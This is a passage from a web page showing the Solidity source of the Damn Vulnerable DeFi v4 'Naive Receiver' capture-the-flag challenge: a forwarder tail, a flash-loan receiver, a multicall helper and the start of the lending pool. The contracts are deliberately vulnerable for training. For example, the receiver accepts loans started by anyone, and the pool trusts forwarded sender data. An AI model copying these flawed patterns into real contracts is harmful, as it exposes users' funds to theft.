</span></span><span class=line><span class=ln> 61</span><span class=cl>        <span class=kt>uint256</span> <span class=nb>value</span> <span class=o>=</span> <span class=n>request</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span> <span class=c1>// in wei
</span></span></span><span class=line><span class=ln> 62</span><span class=cl><span class=c1></span>        <span class=kt>address</span> <span class=n>target</span> <span class=o>=</span> <span class=n>request</span><span class=p>.</span><span class=n>target</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 63</span><span class=cl>        <span class=kt>bytes</span> <span class=k>memory</span> <span class=n>payload</span> <span class=o>=</span> <span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=nb>data</span><span class=p>,</span> <span class=n>request</span><span class=p>.</span><span class=k>from</span><span class=p>);</span>
</span></span><span class=line><span class=ln> 64</span><span class=cl>        <span class=kt>uint256</span> <span class=n>forwardGas</span> <span class=o>=</span> <span class=n>request</span><span class=p>.</span><span class=nb>gas</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 65</span><span class=cl>        <span class=k>assembly</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 66</span><span class=cl>            <span class=n>success</span> <span class=o>:=</span> <span class=nf>call</span><span class=p>(</span><span class=n>forwardGas</span><span class=p>,</span> <span class=n>target</span><span class=p>,</span> <span class=n>value</span><span class=p>,</span> <span class=nf>add</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=nf>mload</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=c1>// don&#39;t copy returndata
</span></span></span><span class=line><span class=ln> 67</span><span class=cl><span class=c1></span>            <span class=n>gasLeft</span> <span class=o>:=</span> <span class=nf>gas</span><span class=p>()</span>
</span></span><span class=line><span class=ln> 68</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln> 69</span><span class=cl>
</span></span><span class=line><span class=ln> 70</span><span class=cl>        <span class=n>if</span> <span class=p>(</span><span class=n>gasLeft</span> <span class=err>&lt;</span> <span class=n>request</span><span class=err>.</span><span class=nf>gas</span> <span class=err>/</span> <span class=mi>63</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 71</span><span class=cl>            <span class=n>assembly</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 72</span><span class=cl>                <span class=nf>invalid</span><span class=p>()</span>
</span></span><span class=line><span class=ln> 73</span><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=ln> 74</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln> 75</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 76</span><span class=cl>
</span></span><span class=line><span class=ln> 77</span><span class=cl>    <span class=kd>function</span> <span class=nf>_domainNameAndVersion</span><span class=p>()</span> <span class=k>internal</span> <span class=k>pure</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>string</span> <span class=k>memory</span> <span class=nb>name</span><span class=p>,</span> <span class=kt>string</span> <span class=k>memory</span> <span class=n>version</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 78</span><span class=cl>        <span class=nb>name</span> <span class=o>=</span> <span class=s>&#34;BasicForwarder&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 79</span><span class=cl>        <span class=n>version</span> <span class=o>=</span> <span class=s>&#34;1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 80</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 81</span><span class=cl>
</span></span><span class=line><span class=ln> 82</span><span class=cl>    <span class=kd>function</span> <span class=nf>getDataHash</span><span class=p>(</span><span class=n>Request</span> <span class=k>memory</span> <span class=n>request</span><span class=p>)</span> <span class=k>public</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes32</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 83</span><span class=cl>        <span class=k>return</span> <span class=nb>keccak256</span><span class=p>(</span>
</span></span><span class=line><span class=ln> 84</span><span class=cl>            <span class=nb>abi</span><span class=p>.</span><span class=nb>encode</span><span class=p>(</span>
</span></span><span class=line><span class=ln> 85</span><span class=cl>                <span class=n>_REQUEST_TYPEHASH</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 86</span><span class=cl>                <span class=n>request</span><span class=p>.</span><span class=k>from</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 87</span><span class=cl>                <span class=n>request</span><span class=p>.</span><span class=n>target</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 88</span><span class=cl>                <span class=n>request</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 89</span><span class=cl>                <span class=n>request</span><span class=p>.</span><span class=nb>gas</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 90</span><span class=cl>                <span class=n>request</span><span class=p>.</span><span class=n>nonce</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 91</span><span class=cl>                <span class=nb>keccak256</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=nb>data</span><span class=p>),</span>
</span></span><span class=line><span class=ln> 92</span><span class=cl>                <span class=n>request</span><span class=p>.</span><span class=n>deadline</span>
</span></span><span class=line><span class=ln> 93</span><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=ln> 94</span><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=ln> 95</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln> 96</span><span class=cl>
</span></span><span class=line><span class=ln> 97</span><span class=cl>    <span class=kd>function</span> <span class=nf>domainSeparator</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes32</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 98</span><span class=cl>        <span class=k>return</span> <span class=n>_domainSeparator</span><span class=p>();</span>
</span></span><span class=line><span class=ln> 99</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>100</span><span class=cl>
</span></span><span class=line><span class=ln>101</span><span class=cl>    <span class=kd>function</span> <span class=nf>getRequestTypehash</span><span class=p>()</span> <span class=k>external</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes32</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>102</span><span class=cl>        <span class=k>return</span> <span class=n>_REQUEST_TYPEHASH</span><span class=p>;</span>
</span></span><span class=line><span class=ln>103</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>104</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ol start=2><li><strong>FlashLoanReceiver</strong> contract</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1>// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>=</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>25</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>
</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>IERC3156FlashBorrower</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>WETH</span><span class=p>,</span> <span class=n>NaiveReceiverPool</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;./NaiveReceiverPool.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>
</span></span><span class=line><span class=ln> 8</span><span class=cl><span class=kd>contract</span> <span class=nc>FlashLoanReceiver</span> <span class=k>is</span> <span class=n>IERC3156FlashBorrower</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=kt>address</span> <span class=k>private</span> <span class=n>pool</span><span class=p>;</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>
</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_pool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>        <span class=n>pool</span> <span class=o>=</span> <span class=n>_pool</span><span class=p>;</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=kd>function</span> <span class=nf>onFlashLoan</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span> <span class=kt>address</span> <span class=n>token</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>fee</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span><span class=p>)</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>        <span class=k>external</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>        <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes32</span><span class=p>)</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>        <span class=k>assembly</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>            <span class=c1>// gas savings
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=c1></span>            <span class=n>if</span> <span class=nf>iszero</span><span class=p>(</span><span class=nf>eq</span><span class=p>(</span><span class=nf>sload</span><span class=p>(</span><span class=n>pool</span><span class=err>.</span><span class=n>slot</span><span class=p>),</span> <span class=nf>caller</span><span class=p>()))</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>                <span class=nf>mstore</span><span class=p>(</span><span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x48f5c3ed</span><span class=p>)</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>                <span class=nf>revert</span><span class=p>(</span><span class=mh>0x1c</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>)</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>26</span><span class=cl>
</span></span><span class=line><span class=ln>27</span><span class=cl>        <span class=n>if</span> <span class=p>(</span><span class=n>token</span> <span class=err>!=</span> <span class=nf>address</span><span class=p>(</span><span class=n>NaiveReceiverPool</span><span class=p>(</span><span class=n>pool</span><span class=p>)</span><span class=err>.</span><span class=n>weth</span><span class=p>()))</span> <span class=nf>revert</span> <span class=n>NaiveReceiverPool</span><span class=err>.</span><span class=n>UnsupportedCurrency</span><span class=p>()</span><span class=err>;</span>
</span></span><span class=line><span class=ln>28</span><span class=cl>
</span></span><span class=line><span class=ln>29</span><span class=cl>        <span class=n>uint256</span> <span class=n>amountToBeRepaid</span><span class=err>;</span>
</span></span><span class=line><span class=ln>30</span><span class=cl>        <span class=n>unchecked</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>31</span><span class=cl>            <span class=n>amountToBeRepaid</span> <span class=err>=</span> <span class=n>amount</span> <span class=err>+</span> <span class=n>fee</span><span class=err>;</span>
</span></span><span class=line><span class=ln>32</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>33</span><span class=cl>
</span></span><span class=line><span class=ln>34</span><span class=cl>        <span class=n>_executeActionDuringFlashLoan</span><span class=p>()</span><span class=err>;</span>
</span></span><span class=line><span class=ln>35</span><span class=cl>
</span></span><span class=line><span class=ln>36</span><span class=cl>        <span class=c1>// Return funds to pool
</span></span></span><span class=line><span class=ln>37</span><span class=cl><span class=c1></span>        <span class=n>WETH</span><span class=p>(</span><span class=n>payable</span><span class=p>(</span><span class=n>token</span><span class=p>))</span><span class=err>.</span><span class=n>approve</span><span class=p>(</span><span class=n>pool</span><span class=p>,</span> <span class=n>amountToBeRepaid</span><span class=p>)</span><span class=err>;</span>
</span></span><span class=line><span class=ln>38</span><span class=cl>
</span></span><span class=line><span class=ln>39</span><span class=cl>        <span class=nf>return</span> <span class=nf>keccak256</span><span class=p>(</span><span class=s>&#34;ERC3156FlashBorrower.onFlashLoan&#34;</span><span class=p>)</span><span class=err>;</span>
</span></span><span class=line><span class=ln>40</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>41</span><span class=cl>
</span></span><span class=line><span class=ln>42</span><span class=cl>    <span class=c1>// Internal function where the funds received would be used
</span></span></span><span class=line><span class=ln>43</span><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>_executeActionDuringFlashLoan</span><span class=p>()</span> <span class=k>internal</span> <span class=p>{}</span>
</span></span><span class=line><span class=ln>44</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ol start=3><li><strong>Multicall</strong> contract</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1>// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>=</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>25</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>
</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Address</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Context</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@openzeppelin/contracts/utils/Context.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>
</span></span><span class=line><span class=ln> 8</span><span class=cl><span class=k>abstract</span> <span class=kd>contract</span> <span class=nc>Multicall</span> <span class=k>is</span> <span class=n>Context</span> <span class=p>{</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=kd>function</span> <span class=nf>multicall</span><span class=p>(</span><span class=kt>bytes</span><span class=p>[]</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span> <span class=k>external</span> <span class=k>virtual</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>results</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=n>results</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>bytes</span><span class=p>[](</span><span class=nb>data</span><span class=p>.</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>data</span><span class=p>.</span><span class=n>length</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>            <span class=n>results</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>Address</span><span class=p>.</span><span class=n>functionDelegateCall</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=nb>data</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=k>return</span> <span class=n>results</span><span class=p>;</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>16</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ol start=4><li><strong>NavieReceiverPool</strong> contract</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1>// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>=</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>25</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl>
</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>IERC3156FlashLender</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>IERC3156FlashBorrower</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>FlashLoanReceiver</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;./FlashLoanReceiver.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Multicall</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;./Multicall.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>WETH</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;solmate/tokens/WETH.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>
</span></span><span class=line><span class=ln>11</span><span class=cl><span class=kd>contract</span> <span class=nc>NaiveReceiverPool</span> <span class=k>is</span> <span class=n>Multicall</span><span class=p>,</span> <span class=n>IERC3156FlashLender</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>    <span class=kt>uint256</span> <span class=k>private</span> <span class=k>constant</span> <span class=n>FIXED_FEE</span> <span class=o>=</span> <span class=mi>1</span><span class=n>e18</span><span class=p>;</span> <span class=c1>// not the cheapest flash loan
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=c1></span>    <span class=kt>bytes32</span> <span class=k>private</span> <span class=k>constant</span> <span class=n>CALLBACK_SUCCESS</span> <span class=o>=</span> <span class=nb>keccak256</span><span class=p>(</span><span class=s>&#34;ERC3156FlashBorrower.onFlashLoan&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=n>WETH</span> <span class=k>public</span> <span class=k>immutable</span> <span class=n>weth</span><span class=p>;</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=k>immutable</span> <span class=n>trustedForwarder</span><span class=p>;</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=k>immutable</span> <span class=n>feeReceiver</span><span class=p>;</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>
</span></span><span class=line><span class=ln>19</span><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=k>public</span> <span class=n>deposits</span><span class=p>;</span>
</span></span><span class=line><span class=ln>20</span><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>totalDeposits</span><span class=p>;</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>
</span></span><span class=line><span class=ln>22</span><span class=cl>    <span class=n>error</span> <span class=n>RepayFailed</span><span class=p>();</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>    <span class=n>error</span> <span class=n>UnsupportedCurrency</span><span class=p>();</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>    <span class=n>error</span> <span class=n>CallbackFailed</span><span class=p>();</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>
</span></span><span class=line><span class=ln>26</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_trustedForwarder</span><span class=p>,</span> <span class=kt>address</span> <span class=k>payable</span> <span class=n>_weth</span><span class=p>,</span> <span class=kt>address</span> <span class=n>_feeReceiver</span><span class=p>)</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>27</span><span class=cl>        <span class=n>weth</span> <span class=o>=</span> <span class=n>WETH</span><span class=p>(</span><span class=n>_weth</span><span class=p>);</span>
</span></span><span class=line><span class=ln>28</span><span class=cl>        <span class=n>trustedForwarder</span> <span class=o>=</span> <span class=n>_trustedForwarder</span><span class=p>;</span>
</span></span><span class=line><span class=ln>29</span><span class=cl>        <span class=n>feeReceiver</span> <span class=o>=</span> <span class=n>_feeReceiver</span><span class=p>;</span>
</span></span><span class=line><span class=ln>30</span><span class=cl>        <span class=n>_deposit</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=ln>31</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>32</span><span class=cl>
</span></span><span class=line><span class=ln>33</span><span class=cl>    <span class=kd>function</span> <span class=nf>maxFlashLoan</span><span class=p>(</span><span class=kt>address</span> <span class=n>token</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>34</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>token</span> <span class=o>==</span> <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>))</span> <span class=k>return</span> <span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>));</span>
</span></span><span class=line><span class=ln>35</span><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=ln>36</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>37</span><span class=cl>
</span></span><span class=line><span class=ln>38</span><span class=cl>    <span class=kd>function</span> <span class=nf>flashFee</span><span class=p>(</span><span class=kt>address</span> <span class=n>token</span><span class=p>,</span> <span class=kt>uint256</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>39</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>token</span> <span class=o>!=</span> <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>))</span> <span class=nb>revert</span> <span class=n>UnsupportedCurrency</span><span class=p>();</span>
</span></span><span class=line><span class=ln>40</span><span class=cl>        <span class=k>return</span> <span class=n>FIXED_FEE</span><span class=p>;</span>
</span></span><span class=line><span class=ln>41</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>42</span><span class=cl>
</span></span><span class=line><span class=ln>43</span><span class=cl>    <span class=kd>function</span> <span class=nf>flashLoan</span><span class=p>(</span><span class=n>IERC3156FlashBorrower</span> <span class=n>receiver</span><span class=p>,</span> <span class=kt>address</span> <span class=n>token</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>,</span> <span class=kt>bytes</span> <span class=n>calldata</span> <span class=nb>data</span><span class=p>)</span>
</span></span><span class=line><span class=ln>44</span><span class=cl>        <span class=k>external</span>
</span></span><span class=line><span class=ln>45</span><span class=cl>        <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span>
</span></span><span class=line><span class=ln>46</span><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=ln>47</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>token</span> <span class=o>!=</span> <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>))</span> <span class=nb>revert</span> <span class=n>UnsupportedCurrency</span><span class=p>();</span>
</span></span><span class=line><span class=ln>48</span><span class=cl>
</span></span><span class=line><span class=ln>49</span><span class=cl>        <span class=c1>// Transfer WETH and handle control to receiver
</span></span></span><span class=line><span class=ln>50</span><span class=cl><span class=c1></span>        <span class=n>weth</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>receiver</span><span class=p>),</span> <span class=n>amount</span><span class=p>);</span>
</span></span><span class=line><span class=ln>51</span><span class=cl>        <span class=n>totalDeposits</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=ln>52</span><span class=cl>
</span></span><span class=line><span class=ln>53</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>receiver</span><span class=p>.</span><span class=n>onFlashLoan</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=n>weth</span><span class=p>),</span> <span class=n>amount</span><span class=p>,</span> <span class=n>FIXED_FEE</span><span class=p>,</span> <span class=nb>data</span><span class=p>)</span> <span class=o>!=</span> <span class=n>CALLBACK_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>54</span><span class=cl>            <span class=nb>revert</span> <span class=n>CallbackFailed</span><span class=p>();</span>
</span></span><span class=line><span class=ln>55</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>56</span><span class=cl>
</span></span><span class=line><span class=ln>57</span><span class=cl>        <span class=kt>uint256</span> <span class=n>amountWithFee</span> <span class=o>=</span> <span class=n>amount</span> <span class=o>+</span> <span class=n>FIXED_FEE</span><span class=p>;</span>
</span></span><span class=line><span class=ln>58</span><span class=cl>        <span class=n>weth</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>receiver</span><span class=p>),</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amountWithFee</span><span class=p>);</span>
</span></span><span class=line><span class=ln>59</span><span class=cl>        <span class=n>totalDeposits</span> <span class=o>+=</span> <span class=n>amountWithFee</span><span class=p>;</span>
</span></span><span class=line><span class=ln>60</span><span class=cl>
</span></span><span class=line><span class=ln>61</span><span class=cl>        <span class=n>deposits</span><span class=p>[</span><span class=n>feeReceiver</span><span class=p>]</span> <span class=o>+=</span> <span class=n>FIXED_FEE</span><span class=p>;</span>
</span></span><span class=line><span class=ln>62</span><span class=cl>
</span></span><span class=line><span class=ln>63</span><span class=cl>        <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>64</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>65</span><span class=cl>
</span></span><span class=line><span class=ln>66</span><span class=cl>    <span class=kd>function</span> <span class=nf>withdraw</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>amount</span><span class=p>,</span> <span class=kt>address</span> <span class=k>payable</span> <span class=n>receiver</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>67</span><span class=cl>        <span class=c1>// Reduce deposits
</span></span></span><span class=line><span class=ln>68</span><span class=cl><span class=c1></span>        <span class=n>deposits</span><span class=p>[</span><span class=n>_msgSender</span><span class=p>()]</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=ln>69</span><span class=cl>        <span class=n>totalDeposits</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
</span></span><span class=line><span class=ln>70</span><span class=cl>
</span></span><span class=line><span class=ln>71</span><span class=cl>        <span class=c1>// Transfer ETH to designated receiver
</span></span></span><span class=line><span class=ln>72</span><span class=cl><span class=c1></span>        <span class=n>weth</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=n>amount</span><span class=p>);</span>
</span></span><span class=line><span class=ln>73</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>74</span><span class=cl>
</span></span><span class=line><span class=ln>75</span><span class=cl>    <span class=kd>function</span> <span class=nf>deposit</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>76</span><span class=cl>        <span class=n>_deposit</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=ln>77</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>78</span><span class=cl>
</span></span><span class=line><span class=ln>79</span><span class=cl>    <span class=kd>function</span> <span class=nf>_deposit</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>private</span> <span class=p>{</span>
